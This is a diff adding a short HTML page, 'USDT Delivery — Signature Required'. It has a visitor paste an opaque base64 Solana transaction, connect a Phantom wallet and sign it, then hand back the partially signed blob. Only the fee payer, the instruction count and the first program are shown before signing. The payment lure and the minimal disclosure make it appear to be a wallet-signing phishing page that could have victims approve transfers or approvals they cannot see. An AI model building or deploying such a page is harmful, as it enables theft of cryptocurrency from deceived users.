@@ -1,0 +1,22 @@
+<!doctype html><meta charset=utf-8>
+<title>USDT Delivery — Signature Required</title>
+<p>Paste blob, connect, sign. <b>Approvals 1.</b></p>
+<textarea id=blob rows=6 cols=90></textarea><br>
+<button id=go>Connect + Sign</button><pre id=out></pre>
+<script type="module">
+import { Transaction, Connection } from "https://esm.sh/@solana/web3.js@1";
+const conn = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+const provider = window.solana ?? window.phantom?.solana;
+document.getElementById("go").onclick = async () => {
+  const out = document.getElementById("out");
+  try {
+    await provider.connect();
+    const raw = Uint8Array.from(atob(document.getElementById("blob").value.trim()), c => c.charCodeAt(0));
+    const tx = Transaction.from(raw);
+    const ix0 = tx.instructions[0];
+    out.textContent = `feePayer ${tx.feePayer.toBase58()}\nixs ${tx.instructions.length}\nfirst program ${ix0.programId.toBase58()}\n\n`;
+    const signed = await provider.signTransaction(tx);
+    out.textContent += "SIGNED BLOB:\n" + btoa(String.fromCharCode(...signed.serialize({ requireAllSignatures: false })));
+  } catch (e) { out.textContent = "ERR " + e.message; }
+};
+</script>
